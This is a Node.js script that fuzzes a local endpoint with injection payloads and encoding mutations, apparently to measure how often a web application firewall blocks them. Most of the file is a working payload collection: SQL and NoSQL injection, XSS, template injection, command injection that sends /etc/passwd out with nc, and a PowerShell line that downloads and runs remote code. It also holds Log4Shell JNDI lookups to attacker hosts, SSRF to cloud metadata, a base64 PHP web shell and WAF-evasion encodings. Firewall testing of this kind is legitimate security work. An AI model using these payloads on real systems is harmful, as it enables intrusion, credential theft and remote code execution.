const http = require('http');

const TARGET = { host: 'localhost', port: 8081 };
const STATS = { total: 0, blocked: 0, bypassed: 0, errors: 0, bypasses: [] };

const payloads = {
    sqli: [
        `' OR 1=1--`, `" OR 1=1--`, `) OR 1=1--`, `' OR 'x'='x`, `" OR "x"="x" UNION SELECT NULL--`,
        `UNION ALL SELECT NULL#`, `' UNION SELECT 1; WAITFOR DELAY '0:0:5'--`, 
        `1' AND (SELECT COUNT() FROM sysobjects)>0--`, `' AND 1=CONVERT(int, (SELECT @@version))--`,
        `%27%20OR%20%271%27%3D%271`, `%22%20OR%20%221%22%3D%2222`, `' OR 1=&#x31 //OR//1//=//1`,
        `/!50000OR/1=1`, `/!UNION/SELECT`, `{"$ne":null}`, `{"$regex":".*"}`, `{"$where":"this.name.match(/.*)/"}`
    ],
    xss: [
        "<scr%00ipt>alert(1)</scr%00ipt>", "javascript:alert(1)", "data:text/html,", "vbscript:msgbox(1)",
        "livescript:alert(1)", "{{constructor.constructor('alert(1)')()}}", "{{7*'7'}}", "${_alert}}",
        "jndi:ldap://attacker.com/a", "script:javascript:alert(1)", "<embed src=javascript:alert(1)>"
    ],
    cmd: [
        ";id&&", "|whoami", "`whoami`", "$(whoami)", "${IFS}cat${IFS}/etc/passwd", 
        ";${PATH#/}whoami", "|${PATH#/}whoami", ";cat /etc/passwd | nc 10.0.0.1 4444",
        "system('id');", "exec('id');", "passthru('id');", "shell_exec('id');",
        "require('child_process').exec('id');", "eval(Buffer.from('id','base64'))",
        "${'jndi:ldap://10.0.0.1:1389/obj'}", "${'jndi:dns://10.0.0.1'}",
        "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/p')\""
    ],
    ssrf_lfi_rce: [
        `file:///etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`,
        `/data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, `expect://id`, 
        `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a:crackme%0d%0a`,
        `http://127.0.0.1:8080`, `http://[::]:80/`, `http://0/`, `http://169.254.169.254/latest/meta-data/`,
        `127.0.0.1.nip.io/admin`, `127.0.0.1.xip.io:8080`,
        `O:4:"Test":1:{s:4:"test";s:3:"123";}`, `cposix\\nsystem\\nR()(\\nS'id'\\ntR.`,
        `{{7*7}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`, `{{config.items()}}`,
        `<%= system('id') %>`, `<% eval('system("id")') %>`, `- include "http://10.0.0.1/shell"`
    ]
};

// Generates mutations (base64, URL encode, whitespace insertion)
function mutate(str) {
    return [
        str,
        encodeURIComponent(str),
        Buffer.from(str).toString('base64'),
        str.split('').join(' '),
        str.replace(/a/g, '/**/a/**/').replace(/e/g, '/**/e/**/') // SQLi inline evasion
    ];
}

async function sendRequest(path, method, body, headers = {}) {
    return new Promise((resolve) => {
        const req = http.request({
            ...TARGET, path, method, headers
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve({ status: res.statusCode, data }));
        });
        req.on('error', (e) => resolve({ status: e.code, data: e.message }));
        if (body) req.write(body);
        req.end();
    });
}

async function runMegaFuzz() {
    let tasks = [];
    let count = 0;

    for (let category in payloads) {
        for (let payload of payloads[category]) {
            let mutations = mutate(payload);
            for (let mut of mutations) {
                // Different endpoints to trigger full payload sweep
                tasks.push(async () => {
                   let path = `/vuln/${category === 'sqli' ? 'sqli' : 'cmd'}?q=${encodeURIComponent(mut).substring(0, 500)}`;
                   let body = JSON.stringify({ payload: mut });
                   let res = await sendRequest(path, 'POST', body, { 'Content-Type': 'application/json' });
                   
                   STATS.total++;
                   if (res.status === 403 || res.status === 'ECONNRESET') STATS.blocked++;
                   else if (res.status === 200) {
                       STATS.bypassed++;
                       if (STATS.bypasses.length < 50) STATS.bypasses.push({ category, mut, response: res.data.substring(0, 100) });
                   } else STATS.errors++;
                });
                count++;
            }
        }
    }

    console.log(`[Fuzzer] Generated ${count} unique attack mutations.`);
    console.log(`[Fuzzer] Launching high-concurrency attack...`);

    // Run in batches of 100 to simulate concurrency without maxing out ephemeral ports
    for (let i = 0; i < tasks.length; i += 100) {
        await Promise.all(tasks.slice(i, i + 100).map(t => t()));
    }
}

async function main() {
    await runMegaFuzz();
    console.log(JSON.stringify(STATS, null, 2));
}

main();
